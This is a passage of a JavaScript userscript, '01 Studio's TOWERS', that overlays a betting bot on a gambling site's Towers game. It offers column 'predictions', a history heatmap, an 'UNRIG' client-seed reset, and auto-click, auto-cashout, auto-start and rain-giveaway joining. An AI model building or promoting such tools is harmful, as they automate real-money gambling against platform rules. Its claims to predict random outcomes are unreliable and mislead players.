 if (!tGame || !tGame.active || tGame.exploded) return;

 const cashout = [...document.querySelectorAll('button')].find(b => {
 const t = b.textContent.trim().toLowerCase();
 return (t === 'cashout' || t === 'cash out' || t.startsWith('cashout')) && !b.disabled;
 });

 if (cashout) {
 setTimeout(() => {
 if (cashout.disabled) {
 if (attempt < 10) tPerformCashout(attempt + 1);
 return;
 }
 tLastCashedOut = true;
 tClickEl(cashout);
 }, 200);
 return;
 }

 if (attempt < 15) setTimeout(() => tPerformCashout(attempt + 1), 250);
 }

 function tPerformAutoStart(attempt) {
 attempt = attempt || 0;
 if (!tAutoStartEnabled) return;
 const start = [...document.querySelectorAll('button')].find(b => {
 const t = b.textContent.trim().toLowerCase();
 return (t === 'start new game' || t === 'new game' || t === 'play again' ||
 t === 'play' || t === 'start game' || t.includes('start')) && !b.disabled;
 });
 if (start) {
 tClickEl(start);
 return;
 }
 if (attempt < 15) {
 const delay = 200 + attempt * 100;
 setTimeout(() => tPerformAutoStart(attempt + 1), delay);
 }
 }

 function tToggleAutoClick() {
 tAutoClickEnabled = !tAutoClickEnabled;
 if (!tAutoClickEnabled) {
 tAutoClickActive = false;
 tUpdateStatus('Auto click off.', TEXT_DIM);
 } else {
 tUpdateStatus(' Auto click ON — will click predicted column.', accentColor);
 if (tGameRunning && tPrediction !== null) setTimeout(tDoAutoClick, 300);
 }
 tUpdateAutoClickBtn();
 }

 function tToggleAutoCashout() {
 tAutoCashoutEnabled = !tAutoCashoutEnabled;
 tUpdateStatus(tAutoCashoutEnabled ? ` Auto cashout ON — after ${tAutoTarget} rows.` : 'Auto cashout off.', tAutoCashoutEnabled ? '#00c97a' : TEXT_DIM);
 tUpdateAutoCashoutBtn();
 }

 function tToggleAutoStart() {
 tAutoStartEnabled = !tAutoStartEnabled;
 tUpdateStatus(tAutoStartEnabled ? ' Auto start ON — will start new game after each round.' : 'Auto start off.', tAutoStartEnabled ? '#00c97a' : TEXT_DIM);
 tUpdateAutoStartBtn();
 }

 function tGetSavedPos() {
 try { return JSON.parse(localStorage.getItem('_01studios_t_pos')); } catch(e) { return null; }
 }
 function tSavePos(x, y) {
 try { localStorage.setItem('_01studios_t_pos', JSON.stringify({x, y})); } catch(e) {}
 }

 function tUpdateStatus(text, color) {
 const el = document.getElementById('_01studios_t_status');
 const dot = document.getElementById('_01studios_t_status_dot');
 if (el) { el.textContent = text; }
 if (dot) {
 const dotColor = color === '#00c97a' ? '#00c97a' : color === '#e05555' ? '#e05555' : color === accentColor ? '#00c97a' : '#333';
 dot.style.background = dotColor;
 dot.style.boxShadow = `0 0 8px ${dotColor}`;
 }
 }

 function tUpdateStats() {
 const set = (id, val, color) => { const el = document.getElementById(id); if (el) { el.textContent = val; if (color) el.style.color = color; } };
 set('_01studios_t_wins', tWins, '#00c97a');
 set('_01studios_t_losses', tLosses, '#e05555');
 const s = tWinStreak > 0 ? tWinStreak : -tLossStreak;
 set('_01studios_t_streak', (s > 0 ? '+' : '') + s, s > 0 ? '#00c97a' : s < 0 ? '#e05555' : accentColor);
 const rowsDone = tGame ? (tGame.completedLevels || []).length : 0;
 const cfg = T_DIFF[tDifficulty] || T_DIFF.easy;
 const mults = T_MULTS[tDifficulty] || T_MULTS.easy;
 const curMult = mults[Math.min(rowsDone, mults.length - 1)] || 1;
 const nextMult = mults[rowsDone + 1] ? mults[rowsDone + 1].toFixed(2) + 'x' : '—';
 set('_01studios_t_mult', curMult.toFixed(2) + 'x', accentColor);
 set('_01studios_t_profit', (tProfit >= 0 ? '+' : '') + tProfit.toFixed(1), tProfit >= 0 ? '#00c97a' : '#e05555');
 const colNames = tDifficulty === 'normal' ? ['LEFT', 'RIGHT'] : ['LEFT', 'MID', 'RIGHT'];
 const predName = tPrediction !== null ? (colNames[tPrediction] || 'COL ' + (tPrediction + 1)) : '—';
 set('_01studios_t_predcol', predName, accentColor);
 set('_01studios_t_nextmult', nextMult, accentColor);
 set('_01studios_t_rowctr', rowsDone + '/' + cfg.rows, accentColor);
 const bar = document.getElementById('_01studios_t_rowbar');
 if (bar) bar.style.width = (rowsDone / cfg.rows * 100).toFixed(0) + '%';
 }

 function tUpdateModeButtons() {
 document.querySelectorAll('._01studios_t_mode_btn').forEach(btn => {
 const active = btn.dataset.mode === tCurrentMode;
 btn.style.background = active ? accentColor + '22' : CARD_BG;
 btn.style.borderColor = active ? accentColor : CARD_BORDER;
 const icon = btn.querySelector('div:first-child');
 const label = btn.querySelector('div:nth-child(2)');
 if (icon) icon.style.color = active ? accentColor : TEXT_DIM;
 if (label) label.style.color = active ? accentColor : TEXT_MAIN;
 });
 }

 function tUpdateTargetButtons() {
 document.querySelectorAll('._01studios_t_tgt_btn').forEach(btn => {
 const n = parseInt(btn.dataset.n);
 const active = n === tAutoTarget;
 btn.style.background = active ? accentColor : CARD_BG;
 btn.style.borderColor = active ? accentColor : CARD_BORDER;
 btn.style.color = active ? '#000' : TEXT_DIM;
 });
 }

 function tUpdateAnalyticsLog() {
 const el = document.getElementById('_01studios_t_log_list');
 if (!el) return;
 if (tAnalyticsLog.length === 0) { el.innerHTML = '<span style="color:#444;">No games played yet.</span>'; return; }
 el.innerHTML = tAnalyticsLog.slice(-50).reverse().map(e => {
 const c = e.result === 'win' ? '#00c97a' : '#e05555';
 return `<div style="color:${c};padding:4px 0;border-bottom:1px solid #222;">[${e.time}] ${e.result.toUpperCase()} · ${e.difficulty} · ${e.rows} rows · ${e.mult.toFixed(2)}x</div>`;
 }).join('');
 }

 function tBuildTowerGrid() {
 const cfg = T_DIFF[tDifficulty] || T_DIFF.easy;
 const rowsDone = tGame ? (tGame.completedLevels || []).length : 0;
 const mults = T_MULTS[tDifficulty] || T_MULTS.easy;
 let html = '';

 for (let r = cfg.rows - 1; r >= 0; r--) {
 const isCompleted = r < rowsDone;
 const isActive = tGame && tGame.active && !tGame.exploded && r === rowsDone;
 const mult = mults[r + 1] ? mults[r + 1].toFixed(2) + 'x' : '';
 const rowBg = isCompleted ? '#00c97a08' : isActive ? accentColor + '08' : '#0a0a0a';
 const rowBorder = isCompleted ? '#00c97a33' : isActive ? accentColor + '55' : '#1a1a1a';

 const elimCols = isActive ? tGetEliminatedCols(tGame, tDifficulty) : [];

 let cells = '';
 for (let c = 0; c < cfg.cols; c++) {
 const isPred = isActive && c === tPrediction;
 const isWon = isCompleted && tGame && tGame.completedLevels && tGame.completedLevels[r] === c;
 const isElim = isActive && elimCols.includes(c) && !isPred;
 let bg = '#111', border = '#1e1e1e', content = '';

	 if (isCompleted) {
	 bg = '#00c97a18'; border = '#00c97a44';
	 content = isWon ? `<span style="color:#00c97a;font-size:13px;font-weight:700;">✓</span>` : `<span style="color:#00c97a44;font-size:11px;">·</span>`;
	 } else if (isPred) {
	 bg = `${accentColor}22`; border = accentColor;
	 content = `<span style="color:${accentColor};font-size:13px;">*</span>`;
	 } else if (isActive) {
 bg = '#1a1a1a'; border = '#2a2a2a';
 }

 cells += `<div style="flex:1;height:28px;border-radius:6px;background:${bg};border:1px solid ${border};display:flex;align-items:center;justify-content:center;transition:all 0.15s;">${content}</div>`;
 }

 html += `
 <div style="display:flex;gap:4px;margin-bottom:3px;background:${rowBg};border:1px solid ${rowBorder};border-radius:8px;padding:3px 4px;align-items:center;">
 <div style="width:36px;text-align:right;color:${isCompleted ? '#00c97a' : isActive ? accentColor : '#333'};font-size:9px;font-weight:700;padding-right:4px;">${mult}</div>
 ${cells}
 <div style="width:16px;text-align:center;color:${isActive ? accentColor : '#222'};font-size:10px;">${isActive ? '◀' : ''}</div>
 </div>`;
 }
 return html;
 }

 function tRenderPanel() {
 const cfg = T_DIFF[tDifficulty] || T_DIFF.easy;
 const rowsDone = tGame ? (tGame.completedLevels || []).length : 0;
 const mults = T_MULTS[tDifficulty] || T_MULTS.easy;
 const nextMult = mults[rowsDone + 1] ? mults[rowsDone + 1].toFixed(2) + 'x' : '—';
 const curMult = mults[Math.min(rowsDone, mults.length - 1)] || 1;
 const colNames = tDifficulty === 'normal' ? ['LEFT', 'RIGHT'] : ['LEFT', 'MID', 'RIGHT'];
 const predName = tPrediction !== null ? (colNames[tPrediction] || 'COL ' + (tPrediction + 1)) : '—';
 const winPct = tWins + tLosses > 0 ? ((tWins / (tWins + tLosses)) * 100).toFixed(0) + '%' : '—';
 const s = tWinStreak > 0 ? tWinStreak : -tLossStreak;
 const streakColor = s > 0 ? '#00c97a' : s < 0 ? '#e05555' : accentColor;
 const profitColor = tProfit >= 0 ? '#00c97a' : '#e05555';

 return `
 <div id="_01studios_t_header" style="display:flex;align-items:center;justify-content:space-between;padding:8px 14px;cursor:move;border-bottom:1px solid ${CARD_BORDER};background:linear-gradient(180deg,${DARK_BG} 0%,#0d0d0d 100%);">
 <div style="display:flex;align-items:center;gap:8px;">
 <img src="${_01_LOGO}" style="width:28px;height:28px;border-radius:6px;object-fit:cover;">
 <div style="display:flex;flex-direction:column;line-height:1;">
 <span style="font-size:14px;font-weight:800;letter-spacing:1.5px;color:${accentColor};text-transform:uppercase;">01 Studio's</span>
 <span style="font-size:8px;color:#444;font-weight:600;letter-spacing:2px;margin-top:1px;">TOWERS v${VERSION}</span>
 </div>
 <div id="_01studios_t_live_badge" style="display:${tGameRunning ? 'block' : 'none'};background:${accentColor}22;border:1px solid ${accentColor}66;color:${accentColor};font-size:8px;font-weight:700;padding:2px 7px;border-radius:20px;letter-spacing:1px;">LIVE</div>
 </div>
 <div style="display:flex;align-items:center;gap:8px;position:relative;">
 <div id="_01studios_t_wheel_wrap" style="position:relative;">
 <button id="_01studios_t_menu_btn" style="background:linear-gradient(135deg,${accentColor}22,${accentColor}44);border:1.5px solid ${accentColor};color:${accentColor};height:32px;padding:0 12px;border-radius:8px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:2px;display:flex;align-items:center;gap:5px;"><span style="font-size:13px;">=</span> MENU</button>
 <div id="_01studios_t_wheel_popup" style="display:none;position:absolute;top:40px;right:0;background:#111;border:1px solid #333;border-radius:14px;padding:8px;z-index:2147483648;box-shadow:0 8px 32px rgba(0,0,0,0.9);min-width:160px;">
                        <div class="_01studios_t_wheel_item" data-action="unrig" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
                            <div><div style="color:#e05555;font-size:11px;font-weight:700;letter-spacing:1px;">UNRIG</div><div style="color:#444;font-size:9px;">Reset client seed</div></div>
                        </div>
 <div class="_01studios_t_wheel_item" data-action="analytics" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:${TEXT_MAIN};font-size:11px;font-weight:700;letter-spacing:1px;">SESSION LOG</div><div style="color:#444;font-size:9px;">View game history</div></div>
 </div>
 <div class="_01studios_t_wheel_item" data-action="heatmap" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:#ff7043;font-size:11px;font-weight:700;letter-spacing:1px;">HEATMAP</div><div style="color:#444;font-size:9px;">Column frequency map</div></div>
 </div>
 <div class="_01studios_t_wheel_item" data-action="settings" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:${TEXT_MAIN};font-size:11px;font-weight:700;letter-spacing:1px;">SETTINGS</div><div style="color:#444;font-size:9px;">Configure behaviour</div></div>
 </div>
 <div class="_01studios_t_wheel_item" data-action="license" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:${TEXT_MAIN};font-size:11px;font-weight:700;letter-spacing:1px;">LICENSE</div><div style="color:#444;font-size:9px;">Key &amp; expiry info</div></div>
 </div>
 </div>
 </div>
 <button id="_01studios_t_passthrough" title="Click-through mode: lets you click tiles behind the panel" style="background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;">&#128065;</button>
 <button id="_01studios_t_minimize" style="background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center;">${tPanelMinimized ? '+' : '−'}</button>
 </div>
 </div>

 <div id="_01studios_t_stats_bar" style="display:grid;grid-template-columns:repeat(5,1fr);gap:6px;padding:10px 14px 0;">
 ${[{id:'_01studios_t_wins',label:'WINS',val:tWins,color:'#00c97a'},{id:'_01studios_t_losses',label:'LOSSES',val:tLosses,color:'#e05555'},{id:'_01studios_t_streak',label:'STREAK',val:(s>0?'+':'')+s,color:streakColor},{id:'_01studios_t_mult',label:'MULT',val:curMult.toFixed(2)+'x',color:accentColor},{id:'_01studios_t_profit',label:'PROFIT',val:(tProfit>=0?'+':'')+tProfit.toFixed(1),color:profitColor}].map(st=>`<div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:8px;text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;letter-spacing:1px;margin-bottom:3px;">${st.label}</div><div id="${st.id}" style="color:${st.color};font-size:15px;font-weight:700;">${st.val}</div></div>`).join('')}
 </div>

 <div id="_01studios_t_body" style="display:${tPanelMinimized ? 'none' : ''};padding:0 14px 14px;">
 <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px;">

 <!-- LEFT COLUMN: Mode + Bankroll + Target rows -->
 <div>
 <div style="margin-bottom:10px;">
 <div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;margin-bottom:8px;">Prediction Mode</div>
 <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
 ${T_MODES.map(m => {
 const active = m.id === tCurrentMode;
 return `<button class="_01studios_t_mode_btn" data-mode="${m.id}" style="background:${active ? accentColor + '22' : CARD_BG};border:1.5px solid ${active ? accentColor : CARD_BORDER};border-radius:12px;padding:12px 10px;cursor:pointer;text-align:center;">${m.icon ? '<div style="font-size:18px;margin-bottom:5px;color:'+(active ? accentColor : TEXT_DIM)+';">'+m.icon+'</div>' : ''}<div style="font-size:12px;font-weight:700;color:${active ? accentColor : TEXT_MAIN};${m.icon ? '' : 'padding:8px 0'}">${m.label}</div></button>`;
 }).join('')}
 </div>
 </div>

 <div style="margin-bottom:10px;">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
 <div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;">Cashout Target</div>
 <div style="color:${accentColor};font-size:9px;">* ${nextMult} next</div>
 </div>
 <div style="display:flex;gap:6px;flex-wrap:wrap;">
 ${[1,2,3,4,5,6,7,8].map(n => {
 const active = n === tAutoTarget;
 return `<button class="_01studios_t_tgt_btn" data-n="${n}" style="width:36px;height:36px;border-radius:8px;cursor:pointer;font-size:12px;font-weight:700;background:${active ? accentColor : CARD_BG};border:1.5px solid ${active ? accentColor : CARD_BORDER};color:${active ? '#000' : TEXT_DIM};">${n}</button>`;
 }).join('')}
 </div>
 </div>

 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px;margin-top:10px;">
 <div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;margin-bottom:10px;">Session</div>
 <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
 <div style="text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">TIMER</div><div id="_01studios_t_session_timer" style="color:${accentColor};font-size:16px;font-weight:700;">0s</div></div>
 <div style="text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">GAMES PLAYED</div><div id="_01studios_t_session_games" style="color:${accentColor};font-size:16px;font-weight:700;">${_sessionGamesPlayed}</div></div>
 </div>
 </div>
 
                    <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px;margin-top:10px;">
                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
                            <div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;">Rain Joiner</div>
                            <div id="_01studios_t_rain_toggle" style="width:34px;height:18px;border-radius:9px;background:${_rainAutoJoin ? '#00c97a' : '#333'};position:relative;cursor:pointer;transition:background 0.2s;">
                                <div style="width:14px;height:14px;border-radius:50%;background:#fff;position:absolute;top:2px;left:${_rainAutoJoin ? '18px' : '2px'};transition:left 0.2s;"></div>
                            </div>
                        </div>
                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                            <div style="text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">JOINS</div><div id="_01studios_t_rain_count" style="color:${accentColor};font-size:16px;font-weight:700;">${_rainJoinCount}</div></div>
                            <div style="text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">STATUS</div><div id="_01studios_t_rain_status" style="color:#00c97a;font-size:11px;font-weight:700;">${_rainAutoJoin ? 'Watching' : 'Off'}</div></div>
                        </div>
                    </div>
</div>

 <!-- RIGHT COLUMN: Tower map -->
 <div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
 <div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;">Tower Map</div>
 <span style="background:${accentColor}22;border:1px solid ${accentColor}44;color:${accentColor};font-size:9px;padding:2px 8px;border-radius:20px;">${tDifficulty.toUpperCase()} · ${cfg.cols} cols</span>
 </div>
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:14px;padding:10px;">
 <div id="_01studios_t_grid">${tBuildTowerGrid()}</div>
 </div>
 <div style="display:flex;justify-content:flex-end;margin-top:8px;padding:0 2px;">
 <button id="_01studios_t_round_id" style="font-size:9px;color:${TEXT_DIM};font-family:monospace;background:#1a1a1a;border:1px solid #333;cursor:pointer;padding:3px 8px;border-radius:6px;transition:all 0.15s;letter-spacing:0.5px;" onmouseover="this.style.borderColor='${accentColor}';this.style.color='${accentColor}'" onmouseout="this.style.borderColor='#333';this.style.color='${TEXT_DIM}'" title="Click to see Round ID">Round ID</button>
 </div>
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:10px 12px;margin-top:10px;">
 <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;text-align:center;">
 <div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:2px;">PREDICT COL</div><div id="_01studios_t_predcol" style="color:${accentColor};font-size:14px;font-weight:700;">${predName}</div></div>
 <div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:2px;">NEXT MULT</div><div id="_01studios_t_nextmult" style="color:${accentColor};font-size:14px;font-weight:700;">${nextMult}</div></div>
 <div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:2px;">ROW</div><div id="_01studios_t_rowctr" style="color:${accentColor};font-size:14px;font-weight:700;">${rowsDone}/${cfg.rows}</div></div>
 </div>
 <div style="margin-top:8px;"><div style="background:#111;border-radius:3px;height:3px;overflow:hidden;"><div id="_01studios_t_rowbar" style="height:100%;width:${(rowsDone/cfg.rows*100).toFixed(0)}%;background:linear-gradient(90deg,${accentColor},#00c97a);border-radius:3px;transition:width 0.3s;"></div></div></div>
 </div>
 </div>
 </div>

 <div style="display:flex;gap:6px;margin-top:12px;flex-wrap:wrap;">
 <button id="_01studios_t_autoclick" style="flex:1;min-width:80px;padding:10px 6px;background:#1a1a1a;border:1.5px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:0.5px;">AUTO CLICK</button>
 <button id="_01studios_t_autocashout" style="flex:1;min-width:80px;padding:10px 6px;background:#1a1a1a;border:1.5px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:0.5px;">AUTO CASH</button>
 <button id="_01studios_t_autostart" style="flex:1;min-width:80px;padding:10px 6px;background:#1a1a1a;border:1.5px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:0.5px;">AUTO START</button>
 <button id="_01studios_t_newgame" style="padding:10px 12px;background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;">R</button>
 </div>
 <div style="display:none;align-items:center;justify-content:flex-start;gap:8px;margin-top:12px;padding:4px 10px;background:#111;border-radius:8px;border:1px solid #222;">
 <div id="_01studios_t_status_dot" style="width:8px;height:8px;border-radius:50%;background:#333;box-shadow:0 0 8px #333;"></div>
 <div id="_01studios_t_status" style="font-size:10px;color:transparent;user-select:none;pointer-events:none;">Waiting for game...</div>
 </div>
 </div>`;
 }

 function tBuildGUI() {
 const existing = document.getElementById('_01studios_t_panel');
 let savedLeft = null, savedTop = null;
 if (existing) {
 savedLeft = existing.style.left;
 savedTop = existing.style.top;
 existing.remove();
 }
 const pos = tGetSavedPos();
 const panel = document.createElement('div');
 panel.id = '_01studios_t_panel';
 const defaultLeft = pos ? pos.x + 'px' : (window.innerWidth - 580) + 'px';
 const defaultTop = pos ? pos.y + 'px' : '80px';
 panel.style.cssText = `position:fixed;left:${savedLeft || defaultLeft};top:${savedTop || defaultTop};width:560px;background:${DARK_BG};border:1px solid ${CARD_BORDER};border-radius:14px;font-family:'Segoe UI',system-ui,sans-serif;color:${TEXT_MAIN};z-index:2147483647;box-shadow:0 8px 40px rgba(0,0,0,0.8),0 0 0 1px ${accentColor}14;user-select:none;overflow:hidden;transition:opacity 0.2s;`;
 panel.innerHTML = tRenderPanel();
 document.body.appendChild(panel);
 tAttachEvents(panel);
 setTimeout(() => {
 tUpdateAutoClickBtn();
 tUpdateAutoCashoutBtn();
 tUpdateAutoStartBtn();
 tUpdateModeButtons();
 tUpdateTargetButtons();
 }, 0);
 return panel;
 }

 function tUpdateGrid() {
 const el = document.getElementById('_01studios_t_grid');
 if (el) el.innerHTML = tBuildTowerGrid();
 }

 function tOpenModal(type) {
 tCloseModal();
 const overlay = document.createElement('div');
 overlay.id = '_01studios_t_modal_overlay';
 overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:2147483646;display:flex;align-items:center;justify-content:center;`;
 overlay.addEventListener('click', e => { if (e.target === overlay) tCloseModal(); });

 const modal = document.createElement('div');
 modal.style.cssText = `background:${DARK_BG};border:1px solid ${CARD_BORDER};border-radius:16px;padding:24px;min-width:360px;max-width:460px;box-shadow:0 20px 60px rgba(0,0,0,0.9);position:relative;max-height:80vh;overflow-y:auto;`;

 if (type === 'analytics') {
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
 <span style="color:${accentColor};font-size:13px;font-weight:700;letter-spacing:2px;">- SESSION LOG</span>
 <button id="_01studios_t_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px;margin-bottom:12px;">
 ${[{label:'WINS',val:tWins,color:'#00c97a'},{label:'LOSSES',val:tLosses,color:'#e05555'},{label:'W-RATE',val:tWins+tLosses>0?(tWins/(tWins+tLosses)*100).toFixed(0)+'%':'—',color:accentColor},{label:'PROFIT',val:(tProfit>=0?'+':'')+tProfit.toFixed(1),color:tProfit>=0?'#00c97a':'#e05555'}].map(s=>`<div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:10px;text-align:center;"><div style="color:#555;font-size:9px;margin-bottom:3px;">${s.label}</div><div style="color:${s.color};font-size:15px;font-weight:700;">${s.val}</div></div>`).join('')}
 </div>
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:10px;">
 <div id="_01studios_t_log_list" style="max-height:220px;overflow-y:auto;font-size:10px;color:${TEXT_DIM};">${tAnalyticsLog.length===0?'<span style="color:#444;">No games played yet.</span>':tAnalyticsLog.slice(-50).reverse().map(e=>{const c=e.result==='win'?'#00c97a':'#e05555';return`<div style="color:${c};padding:4px 0;border-bottom:1px solid #222;">[${e.time}] ${e.result.toUpperCase()} · ${e.difficulty} · ${e.rows} rows · ${e.mult.toFixed(2)}x</div>`;}).join('')}</div>
 </div>`;
 } else if (type === 'heatmap') {
 const cfg = T_DIFF[tDifficulty] || T_DIFF.easy;
 const freq = tGetColumnFrequency(tDifficulty);
 const hist = tGetHistory(tDifficulty);
 const maxF = Math.max(...freq, 1);
 const colNames = tDifficulty === 'normal' ? ['LEFT', 'RIGHT'] : ['LEFT', 'MID', 'RIGHT'];
 const cells = freq.map((f, i) => {
 const pct = maxF > 0 ? ((f / maxF) * 100).toFixed(0) : 0;
 const t = f / maxF;
 const r = Math.round(14 + t * (224 - 14));
 const g = Math.round(43 + (1 - t) * (201 - 43));
 const b = Math.round(26 + (1 - t) * (122 - 26));
 const bg = maxF === 0 ? '#1a1a1a' : f === 0 ? '#0d2b1a' : `rgb(${r},${g},${b})`;
 const textColor = t > 0.5 ? '#fff' : '#aaa';
 return `<div title="Col ${colNames[i]||i+1}: ${f} appearances" style="background:${bg};border-radius:8px;padding:16px 8px;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:${textColor};cursor:default;"><div style="font-size:18px;margin-bottom:4px;">${f}</div><div style="font-size:10px;font-weight:700;">${colNames[i]||'COL'+(i+1)}</div><div style="font-size:9px;opacity:0.7;">${pct}%</div></div>`;
 }).join('');
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
 <span style="color:#ff7043;font-size:13px;font-weight:700;letter-spacing:2px;">+ COLUMN HEATMAP</span>
 <button id="_01studios_t_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
 <span style="color:#555;font-size:10px;">${tDifficulty.toUpperCase()} · ${cfg.cols} columns</span>
 <span style="color:${accentColor};font-size:10px;font-weight:700;">${hist.length} games recorded</span>
 </div>
 ${hist.length < 10 ? `<div style="background:#1a1a00;border:1px solid #ff980033;border-radius:8px;padding:8px 12px;margin-bottom:12px;color:#ff9800;font-size:10px;">Warning: Only ${hist.length}/10 games recorded. History Engine confidence is low.</div>` : ''}
 <div style="display:grid;grid-template-columns:repeat(${cfg.cols},1fr);gap:8px;margin-bottom:14px;">${cells}</div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
 <div style="display:flex;align-items:center;gap:6px;font-size:9px;color:#555;">
 <div style="width:12px;height:12px;background:#0d2b1a;border-radius:3px;"></div> Rare
 <div style="width:12px;height:12px;background:rgb(119,122,74);border-radius:3px;"></div> Common
 <div style="width:12px;height:12px;background:rgb(224,43,26);border-radius:3px;"></div> Hot zone
 </div>
 </div>
 <button id="_01studios_t_heatmap_clear" style="width:100%;padding:9px;background:#e0555518;border:1px solid #e0555544;color:#e05555;border-radius:8px;cursor:pointer;font-size:10px;font-weight:700;">X Clear History for ${tDifficulty.toUpperCase()}</button>`;
 } else if (type === 'settings') {
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
 <span style="color:${TEXT_MAIN};font-size:13px;font-weight:700;letter-spacing:2px;">SETTINGS</span>
 <button id="_01studios_t_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="margin-bottom:16px;">
 <div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;margin-bottom:10px;">THEME COLOR</div>
 <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px;">
 ${['#f5c518','#00c97a','#4f9eff','#e05555','#b44fff','#ff7043','#00bcd4','#ffffff'].map(c=>`<div class="_01studios_t_theme_swatch" data-color="${c}" style="width:28px;height:28px;border-radius:50%;background:${c};cursor:pointer;border:2px solid ${c===accentColor?'#fff':'transparent'};box-shadow:${c===accentColor?'0 0 0 1px '+c:'none'};"></div>`).join('')}
 </div>
 <div style="display:flex;align-items:center;gap:8px;">
 <input type="color" id="_01studios_t_s_colorwheel" value="${accentColor}" style="width:36px;height:36px;border:none;background:none;cursor:pointer;border-radius:8px;">
 <span id="_01studios_t_s_colorhex" style="color:${accentColor};font-size:11px;font-family:monospace;">${accentColor}</span>
 </div>
 </div>
 <button id="_01studios_t_reset_pos_btn" style="width:100%;padding:9px;background:#2a2a2a;border:1px solid #333;color:#888;border-radius:8px;cursor:pointer;font-size:10px;font-weight:700;margin-bottom:8px;">R Reset Panel Position</button>
 <button id="_01studios_t_settings_save" style="width:100%;padding:10px;background:linear-gradient(135deg,${accentColor}22,${accentColor}44);border:1.5px solid ${accentColor};color:${accentColor};border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;letter-spacing:1px;">SAVE SETTINGS</button>`;
 } else if (type === 'license') {
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
 <span style="color:${TEXT_MAIN};font-size:13px;font-weight:700;letter-spacing:2px;">- LICENSE</span>
 <button id="_01studios_t_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:16px;margin-bottom:14px;text-align:center;">
 
 <div style="color:${TEXT_MAIN};font-size:13px;font-weight:700;margin-bottom:4px;">License Active</div>
 <div style="color:#555;font-size:11px;">Managed by 01 Studio's Loader</div>
 </div>
